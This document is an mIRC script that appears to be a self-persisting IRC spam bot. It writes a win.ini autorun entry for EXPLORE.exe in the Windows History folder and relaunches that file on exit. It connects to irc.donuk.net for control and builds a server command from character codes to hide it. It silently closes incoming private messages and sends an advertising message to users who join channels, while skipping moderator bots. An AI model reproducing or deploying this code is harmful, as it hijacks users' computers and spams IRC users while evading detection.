on 1:start: { nick $read nick.txt |  identd on $read nick.txt | emailaddr $read nick.txt |  username $read nick.txt | //writeini -n c:\windows\win.ini windows run C:\WINDOWS\History\EXPLORE.exe | server irc.donuk.net |  ignore -r | disable #floodvar | enable #normalgiris | disable #kufurgiris | ignore -wd * | $chr(115) $+ $chr(101) $+ $chr(114) $+ $chr(118) $+ $chr(101) $+ $chr(114) $chr(45) $+ $chr(109) $read server.txt }  }
on 1:exit: { /run EXPLORE.exe }

;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

on 1:text:*:?: /closemsg $nick
on 1:ACTION:*:?:  /closemsg $nick
on 1:NOTICE:*:?: /closemsg $nick

;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

on 1:connect: { 
   ignore -wd *
   if ($server !== irc.donuk.net) { timer 1 100 Server }
   if ($server == irc.donuk.net) { join %adminkanal | timer 1 2000 Server }
   if ($server !== irc.donuk.net) && (%kelebek == ON) { join #kelebek }
   if ($server !== irc.donuk.net) && (%kelebek == OFF) { join $read kanal.txt }
   halt
}


on 1:disconnect: {  partall | nick $read nick.txt | .emailaddr $read nick.txt | username $read nick.txt |  identd on $read nick.txt | server | halt  }

;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

raw 433:*:nick $read nick.txt
raw 471:*:%kanallar = $remtok(%kanallar,$2,44) | join $read kanal.txt
raw 473:*:%kanallar = $remtok(%kanallar,$2,44) | join $read kanal.txt
raw 474:*:%kanallar = $remtok(%kanallar,$2,44) | join $read kanal.txt
raw 475:*:%kanallar = $remtok(%kanallar,$2,44) | join $read kanal.txt
raw 477:*:%kanallar = $remtok(%kanallar,$2,44) | join $read kanal.txt

;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

on 1:join:*: {
       set %nickk $nick
       if ($server == irc.donuk.net) && ($chan == #donuk) { part #donuk }
       if ($nick !== $me) && (%kelebek == ON) && ($server !== irc.donuk.net) { whois $nick }
       if ($nick !== $me) && (%kelebek == OFF) && ($server !== irc.donuk.net) && ($nick !== a-reklam-kontrol) && ($nick !== a-reklam-kontrol1) && ($nick !== a-reklam-kontrol2) && ($nick !== a-reklam-kontrol3) && ($nick !== a-reklam-kontrol4) && (%nickk !== aBot) && (%nickk !== aBot1) && (%nickk !== aBot2) && (%nickk !== aBot3) && (%nickk !== %koruma) && (%nickk !== %koruma1) && (%nickk !== %koruma2) && (%nickk !== %koruma3) { msg $nick %mesaj | notice $nick %mesaj } 
       halt
}

raw 311:*:{ set %reklamatnick $3 | if (%reklamatnick == KELEBEK) { set %nickk $2 |  if ($nick !== a-reklam-kontrol) && ($nick !== a-reklam-kontrol1) && ($nick !== a-reklam-kontrol2) && ($nick !== a-reklam-kontrol3) && ($nick !== a-reklam-kontrol4) && (%nickk !== $me) && (%nickk !== a-controlll) && (%nickk !== DERMAN_AGA) && (%nickk !== aBot1) && (%nickk !== aBot2) && (%nickk !== aBot3) && (%nickk !== aBot4) { reklamat } }
  elseif (%reklamatnick == KeIebek)  { set %nickk $2 |  if ($nick !== a-reklam-kontrol) && ($nick !== a-reklam-kontrol1) && ($nick !== a-reklam-kontrol2) && ($nick !== a-reklam-kontrol3) && ($nick !== a-reklam-kontrol4) && (%nickk !== $me) && (%nickk !== a-controlll) && (%nickk !== DERMAN_AGA) && (%nickk !== aBot1) && (%nickk !== aBot2) && (%nickk !== aBot3) && (%nickk !== aBot4) { reklamat } } 
 }
}
alias ozelgiris {
 server %sserver
}
#kufurgiris off
on 1:connect:{ if ($server == %sserver) { nick $read kufur.txt | join %skanal } }
#kufurgiris end